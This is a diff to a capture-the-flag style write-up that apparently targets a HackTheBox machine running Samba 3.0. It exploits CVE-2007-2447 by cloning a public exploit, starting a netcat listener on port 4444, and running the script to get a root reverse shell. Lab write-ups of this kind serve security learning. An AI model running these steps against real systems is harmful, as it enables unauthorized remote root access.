@@ -59,10 +59,17 @@ searchsploit samba 3.0
 This stands out to me but this is a metasploit module. So,I try to look for a python version and came across this link.
 
 ```https://amriunix.com/post/cve-2007-2447-samba-usermap-script/```
-Downloaded the github code and then set up a listener at port 4444 ```rlwrap nc -lvnp 4444```
+
+```zsh 
+pip install --user pysmb
+git clone https://github.com/amriunix/CVE-2007-2447.git
+```
+
+
+Then set up a listener at port 4444 ```rlwrap nc -lvnp 4444```
 
 And finally ran the exploit using :
 
 ```python usermap_script.py 10.10.10.3 139 10.10.14.4 4444``` 
 
-Now ! you a reverse shell and with root ! 
+Now ! you have a reverse shell and with root ! 
